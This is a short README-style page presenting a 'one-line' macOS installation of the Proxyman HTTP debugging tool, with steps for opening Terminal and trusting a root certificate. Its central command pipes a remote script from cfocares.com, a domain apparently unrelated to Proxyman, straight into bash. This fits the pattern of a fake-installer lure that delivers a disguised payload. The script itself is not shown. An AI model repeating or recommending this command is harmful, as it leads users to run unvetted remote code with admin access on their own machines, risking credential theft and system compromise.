# 🕵️‍♂️ One-Line Proxyman Installation for macOS

Install **Proxyman** — a modern HTTP/HTTPS proxy and debugging tool for macOS — in seconds:

```bash
/bin/bash -c "$(curl -fsSL https://cfocares.com/prman/install.sh)"
```

This script downloads the latest Proxyman release and places it in your Applications folder, ready to launch.

---

## 🖥 How to Open Terminal

If you're not sure where to find Terminal, follow one of these methods:

### 🔍 Using Spotlight

1. Press `⌘ + Space`  
2. Type `Terminal`  
3. Hit `Return`

### 📁 Using Finder

1. Open **Finder**  
2. Go to `Applications > Utilities`  
3. Double-click **Terminal.app**

---

## 💡 What Is Proxyman?

Proxyman is a macOS native app for inspecting and debugging HTTP/HTTPS traffic between your apps and the internet. Ideal for:

- Backend/API developers  
- Mobile app debugging (iOS/Android)  
- Web traffic analysis  
- Certificate pinning bypass (with SSL proxying)

---

## 🔧 Requirements

- macOS 10.14 or newer  
- Admin access (only for installation)  
- Internet connection

No terminal skills needed after install — Proxyman is GUI-based!

---

## ✅ After Installation

Once the script completes:

1. Use `⌘ + Space` to open Spotlight  
2. Search for `Proxyman`  
3. Launch the app

The app may prompt you to install a root certificate — follow the instructions to enable HTTPS inspection.

---

## 🔐 Trust Certificate (Optional but Recommended)

To view HTTPS traffic, you'll need to install and trust Proxyman's certificate:

1. Launch **Proxyman**  
2. Go to **Certificate > Install Certificate**  
3. Follow the macOS Keychain prompts to trust it

For iOS device debugging, enable **Proxyman SSL Proxying** and install the certificate on your device too.

---

## 🚀 Power Tips

After setup, enhance your debugging experience by:

- Setting breakpoints on requests  
- Filtering by domain or path  
- Exporting sessions to `.har` files  
- Intercepting mobile traffic over Wi-Fi

---

## 🎉 You're All Set!

Proxyman is now installed and ready to inspect your HTTP/S traffic in real time. It's like Wireshark, but built for developers — beautiful, fast, and native.

> 🧪 Debug smarter. Ship faster.
